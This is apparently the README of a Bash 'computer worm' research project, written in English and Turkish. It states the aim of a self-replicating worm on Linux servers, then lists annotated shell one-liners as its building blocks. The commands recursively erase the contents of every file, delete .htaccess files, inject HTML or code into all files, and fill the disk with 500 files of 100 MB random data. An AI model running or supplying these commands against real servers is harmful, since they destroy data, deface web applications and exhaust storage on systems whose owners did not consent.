# Bash Script Worm (Security Research)
# Author: Efe Cetinkaya


# EN: The purpose of the project was,
to see how complex a Computer Worm I could write on Linux-based servers using the Bash Script language through an attack scenario. Essentially, my goal was to create a small worm on the server that can replicate itself, occupy memory space by filling it with unnecessary files, target and delete .htaccess files if possible (usually for web applications), and allow the attacker to add and edit the content of target files according to the scenario. If this project is completed, it could be further developed and used for educational purposes and penetration testing in the field of cyber security.

# TR: Projenin amacı,
Bash Script dilini kullanarak bir saldırı senaryosu üzerinden Linux tabanlı sunucularda ne kadar komplike bir Computer Worm yazabileceğimi görmekti. Temelde sunucu üzerinde; kendini kopyalayan, bellek alanını gereksiz dosyalarla doldurup işgal eden, mümkünse (genelde web aplikasyonları için) .htaccess dosyalarını hedef alıp silebilen, hedef dosyaların içerğinide senaryoya göre saldırgan tarafından ekleme ve düzenleme yapabilen küçük bir solucan yaratmaktı amacım. Daha da geliştirilebilir bu proje tamamlandığı takdirde siber güvenlik alanında, eğitim amaçlı ve penetrasyon testlerinde kullanılabilir.


- "find . '(' -type d -name filmler -prune ')' -o '(' -type d -name otherdir -prune ')' -o -name '*baba*.txt' -prune -o -name '*mem*.txt' -prune -o -type f -print" --> "mem" ve "baba" adları ile beraber "filmler" ve "otherdir" dizinlerini de taramaya dahil etmez, yani find komutuyla aynı anda 2 dosya adını ve 2 dizin adını aramadan hariç tuttuk ve bu şekilde 2 veya daha fazla dosya veya dizin adını tek komutda dışlayabilirsin. --> https://stackoverflow.com/questions/64362890/exclude-both-file-and-directory-at-the-same-time-with-find-command

- "find . '(' -type d -name filmler -prune ')' -o -name '*baba*.txt' -prune -o -name '*mem*.txt' -prune -o -type f -print" --> "mem" ve "baba" adları dışında "filmler" dizinini de taramaya dahil etmez, yani find komutuyla aynı anda 2 dosya adını ve 1 dizin adını aramadan hariç tuttuk. --> https://stackoverflow.com/questions/64362890/exclude-both-file-and-directory-at-the-same-time-with-find-command

- "find . -type f -name '*.txt' ! -name '*baba*.txt' ! -name '*mem*.txt'" --> .txt uzantılı tüm dosyaları arar fakat isminde "baba" ve "mem" kelimesi içeren tüm .txt dosyalarını hariç tutar. --> https://stackoverflow.com/questions/22558245/exclude-list-of-files-from-find

- "find . -type f -name "*.txt" ! -path "./Movies/*" ! -path "./Downloads/*" ! -path "./Music/*"" --> Sadece belirli dizin veya dizinleri hariç tutmak isteseydik bu komutu bu parametlerlekullanacaktık. --> https://www.cyberciti.biz/faq/find-command-exclude-ignore-files/

- "find . -type f | xargs -d '\n' sh -c 'echo "<--HTML-YAZISI=\"tınak-isaretli-yazi\"-->" | tee "$@"' _" --> Tırnak işaretlerini (") başlarına (\) bu ifadeyi getirerek ekletebilirsin. --> https://github.com/koalaman/shellcheck/wiki/SC2140

- "find . -type f | xargs -d '\n' sh -c 'echo "html-kodu" | tee "$@"' _" -->  Bulunduğun dizin ve altındaki tüm dizinlerdeki dosyaların hepsine yazı veya kod ekler. --> https://stackoverflow.com/questions/64336217/i-need-help-applying-this-command-to-all-files-and-subdirectories-echo-text

- "find . -type f -exec sed -i 's/.//g' {} +" --> Bulunduğun dizin ve altındaki tüm dizinlerdeki dosyaların hepsinin içeriğini siler. --> http://web.deu.edu.tr/doc/lis/lis-7.html

- "find . -type f -name "SILINECEK-DOSYA" -exec rm -f {} \;"--> Bulunduğun dizin ve altındaki tüm dizinlerde ".htaccess" dosyalarını arayıp bulur ve siler  --> https://bilgegunluk.com/linux-bul-ve-sil-komutu-find-and-delete-command/

- "{0001..0500}" arası yani 500 tane dosya oluşturur

- "do head -c 100M" 100 MB büyüklüğünde olur her bir dosya

- "</dev/urandom >$RANDOM$i; done", "$RANDOM" yerine ($i dahil edilmeden direkt $RANDOM'un yerine) file yazılırsa dosya isimleri file0001 file0002 olur!

- "for i in {0001..0500}; do head -c 100M </dev/urandom >$RANDOM$i; done" --> https://unix.stackexchange.com/questions/199863/create-many-files-with-random-content
